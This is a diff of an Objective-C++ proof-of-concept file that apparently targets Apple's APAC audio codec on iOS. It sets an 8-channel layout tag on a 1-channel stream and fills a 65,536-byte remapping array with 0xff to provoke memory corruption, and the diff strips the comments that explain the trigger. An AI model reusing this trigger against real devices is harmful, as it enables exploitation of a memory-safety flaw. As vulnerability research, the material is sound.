@@ -1,7 +1,3 @@
-//clang++ -fobjc-arc -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) -framework AVFAudio -framework AudioToolbox -std=c++11 poc_variation3.mm -o poc_variation3
-//A single-channel audio stream. mChannelLayoutTag set to 8 channels (kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8), mismatching the 1-channel input.
-//A 65,536-byte mRemappingArray filled with 0xff. Random audio buffer values in [-1.0, 1.0].
-
 @import AVFAudio;
 @import AudioToolbox;
 #include <vector>
@@ -25,7 +21,7 @@ void OverrideApac(CodecConfig* config) {
   if (config->remappingChannelLayout) {
     config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8;
   }
-  config->mRemappingArray.resize(0x10000, 0xff); // Pre-size and fill with 0xff
+  config->mRemappingArray.resize(0x10000, 0xff);
 }
 
 int main() {
@@ -55,7 +51,6 @@ int main() {
         [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 1];
 
     CodecConfig config;
-    // Copy the channel layout to avoid const issues
     AudioChannelLayout* channelLayoutCopy = (AudioChannelLayout*)malloc(sizeof(AudioChannelLayout));
     if (!channelLayoutCopy) {
       fprintf(stderr, "Memory allocation failed for sample rate %.0f\n", sampleRate);
